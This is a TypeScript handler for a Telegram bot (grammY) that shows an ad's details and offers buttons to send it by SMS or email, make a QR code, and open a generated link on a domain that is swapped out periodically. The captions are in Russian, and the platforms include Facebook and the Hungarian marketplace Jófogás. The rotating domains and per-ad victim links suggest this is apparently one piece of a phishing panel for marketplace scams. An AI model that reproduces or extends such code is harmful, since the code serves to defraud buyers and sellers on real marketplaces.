import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard, InputFile} from "grammy";
import {adsRepository, domensRepository, profilesRepository} from "@/database";
import moment from "moment";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";

export const composer = new Composer<Context>()
composer.callbackQuery(/^ad (?<id>\d+)/gmi, handler)

export async function handler(ctx: Context)  {
    try {
        await ctx.deleteMessage().then()
    }catch (e) {console.log(e)}
    const match = /^ad (?<id>\d+)/gmi.exec(ctx.callbackQuery.data)

    const ad = await adsRepository.findOne({
        relations: ['profile'],
        where: {
            id: Number(match.groups.id)
        }
    })

    if (!ad) return ctx.reply('ad undefined')

    const domen = await domensRepository.findOne({
        where: {
            active: true,
            service: ad.service
        }
    })

    const keyb = new InlineKeyboard()

    keyb.row()

    if (ad.service === 'facebook' || ad.service === 'jofogas') {
        keyb.text("📲 SMS", `sms ${ad.service} ad ${ad.id}`)
        keyb.text("💌 EMAIL", `email ${ad.service} ad ${ad.id}`)
    } else {
        keyb.text("📲 SMS", `sms ad ${ad.id}`)
        keyb.text("💌 EMAIL", `email ad ${ad.id}`)
    }

    keyb.row()
    keyb.text("🎲 QR-code", `qrcode get ${ad.id}`)
    keyb.text("⚙ Настройки", `settings ad ${ad.id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)


    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption: `
🐨 ID объявления: <code>${ad.date}</code>

🌳 <b>Название:</b> <code>${ad.title}</code>
🌳 <b>Цена:</b> <code>${ad.price}</code>
🌳 <b>Платформа: ${ad.service.toUpperCase()} [${ad.country.toUpperCase()} ${getFlagEmoji(ad.country)}]</b>${(ad.profile) ? `\n<b>🌳 Профиль:</b> <code>${ad.profile.fullName}</code>` : ''} 
♻️ <b>Домен сменён ${moment(domen.dateChange).fromNow()}</b>
➖➖➖➖➖➖➖
💠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ad.link}">LINK</a>

`,
        reply_markup: keyb
    })

}